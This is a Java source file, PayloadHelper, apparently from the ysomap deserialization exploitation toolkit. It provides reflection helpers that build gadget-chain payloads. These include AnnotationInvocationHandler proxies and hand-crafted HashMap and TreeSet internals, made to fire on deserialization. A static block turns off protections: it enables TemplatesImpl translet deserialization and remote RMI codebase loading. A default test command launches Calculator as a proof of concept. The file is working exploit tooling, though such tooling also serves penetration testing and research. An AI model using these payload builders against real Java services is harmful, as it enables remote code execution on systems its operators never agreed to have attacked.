package ysomap.core.util;

import ysomap.common.exception.GenerateErrorException;
import ysomap.core.ObjectGadget;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;
import java.util.TreeSet;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/**
 * @author wh1t3P1g
 * @since 2020/2/11
 */
@SuppressWarnings({"rawtypes","unchecked"})
public class PayloadHelper {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";


    public static <T> T createMemoitizedProxy (final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) ReflectionHelper.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(PayloadHelper.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        ReflectionHelper.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ReflectionHelper.setFieldValue(s, "table", tbl);
        return s;
    }

    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        ReflectionHelper.setFieldValue(m, "size", 2);
        ReflectionHelper.setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        ReflectionHelper.setFieldValue(node, "right", right);
        ReflectionHelper.setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        ReflectionHelper.setFieldValue(set, "m", m);
        return set;
    }

    public static String defaultTestCommand(){
        return "open /System/Applications/Calculator.app";
    }

    public static ObjectGadget makeGadget(Class<? extends ObjectGadget> clazz, String type) throws GenerateErrorException {
        try {
            return clazz.newInstance();
        } catch (Exception e) {
            throw new GenerateErrorException(type, clazz.getSimpleName());
        }
    }
}
